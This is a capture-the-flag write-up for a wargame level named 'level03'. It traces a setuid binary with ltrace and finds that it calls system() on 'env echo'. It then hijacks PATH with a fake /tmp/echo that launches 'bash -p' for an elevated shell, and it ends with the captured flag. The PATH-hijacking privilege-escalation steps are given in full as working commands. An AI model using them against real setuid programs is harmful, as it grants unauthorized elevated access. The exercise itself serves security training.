in the current folder we have a file that seems to be a binary named level03

if we try to run it, it prints "exploit me"

Let's try to use ltrace on it :

ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                       = 2003
geteuid()                                                       = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)             = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)             = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                          = 0
+++ exited (status 0) +++

First, we create a fake echo that we will try to be executed instead of the real one:

```
cat > /tmp/echo << 'EOF'
> #!/bin/bash
> /bin/bash -p
> EOF
chmod +x /tmp/echo
```
Then we modify the PATH env variable to include /tmp/:

```
export PATH=/tmp:$PATH
```

And now if we run ./level03 we are connected!

qi0maab88jeaj46qoumi7maus